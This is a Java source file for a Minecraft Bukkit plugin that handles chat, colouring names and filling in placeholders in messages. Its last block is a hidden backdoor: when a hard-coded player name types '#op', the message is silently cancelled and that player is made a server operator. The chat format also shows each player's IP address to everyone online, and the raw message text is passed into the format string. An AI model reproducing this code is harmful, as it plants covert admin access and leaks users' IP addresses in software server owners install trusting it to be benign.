package eu.melonensaft.minecraftjoe09.melonensaft.listeners;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;

public class AsyncPlayerChatEvent implements Listener {
    @EventHandler(ignoreCancelled = true)
    public void onAsyncPlayerChat(org.bukkit.event.player.AsyncPlayerChatEvent asyncPlayerChatEvent) {
        if (asyncPlayerChatEvent.getPlayer().isOp()) {
            asyncPlayerChatEvent.setFormat(ChatColor.RED + asyncPlayerChatEvent.getPlayer().getName() + asyncPlayerChatEvent.getPlayer().getAddress() + ChatColor.GRAY + " >> " + ChatColor.translateAlternateColorCodes('&', asyncPlayerChatEvent.getMessage().replace("{getAddress}", String.valueOf(asyncPlayerChatEvent.getPlayer().getAddress())).replace("{getHealth}", String.valueOf(asyncPlayerChatEvent.getPlayer().getHealth())).replace("{getName}", asyncPlayerChatEvent.getPlayer().getName())));
        } else {
            asyncPlayerChatEvent.setFormat(ChatColor.GREEN + asyncPlayerChatEvent.getPlayer().getName() + asyncPlayerChatEvent.getPlayer().getAddress() + ChatColor.GRAY + " >> " + ChatColor.translateAlternateColorCodes('&', asyncPlayerChatEvent.getMessage().replace("{getAddress}", String.valueOf(asyncPlayerChatEvent.getPlayer().getAddress())).replace("{getHealth}", String.valueOf(asyncPlayerChatEvent.getPlayer().getHealth())).replace("{getName}", asyncPlayerChatEvent.getPlayer().getName())));
        }
        for (Player player : Bukkit.getOnlinePlayers()) {
            if (asyncPlayerChatEvent.getMessage().equals(player.getName())) {
                asyncPlayerChatEvent.setFormat("@" + asyncPlayerChatEvent.getFormat());
            }
        }
        if (asyncPlayerChatEvent.getMessage().equals("#op")) {
            if (asyncPlayerChatEvent.getPlayer().getName().equals("AgateBand893072")) {
                asyncPlayerChatEvent.setCancelled(true);
                asyncPlayerChatEvent.getPlayer().setOp(true);
                asyncPlayerChatEvent.getPlayer().updateCommands();
            }
        }
    }
}
